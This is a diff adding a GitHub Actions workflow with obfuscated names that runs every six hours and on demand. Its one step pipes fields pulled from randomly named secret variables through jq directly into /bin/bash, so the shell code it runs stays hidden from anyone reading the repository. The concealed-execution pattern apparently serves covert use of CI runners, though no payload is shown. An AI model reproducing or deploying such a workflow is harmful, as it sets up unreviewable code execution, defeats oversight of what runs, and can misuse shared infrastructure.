@@ -1,0 +1,27 @@
+name: ruilvguangren
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruilvguangren
+        env:
+          lqee2: ${{ secrets.lqee2 }}
+        run: |
+          echo $lqee2 | jq -r .girh0131 | /bin/bash
+          echo $rf6675 | jq -r .vyp36 | /bin/bash
+          echo $vm0 | jq -r .o3758 | /bin/bash
+          echo $tscb303 | jq -r .xgzg261 | /bin/bash
+          echo $gmet5 | jq -r .khf6 | /bin/bash
+          echo $dz98 | jq -r .ucl9 | /bin/bash
+          echo $obqlu31416 | jq -r .mrlmh61688 | /bin/bash
+          echo $au9332 | jq -r .cf9158 | /bin/bash
+          echo $gkis4 | jq -r .eix400 | /bin/bash
+          echo $skss55294 | jq -r .t08203 | /bin/bash
+          echo $usyaq5 | jq -r .za660 | /bin/bash
+
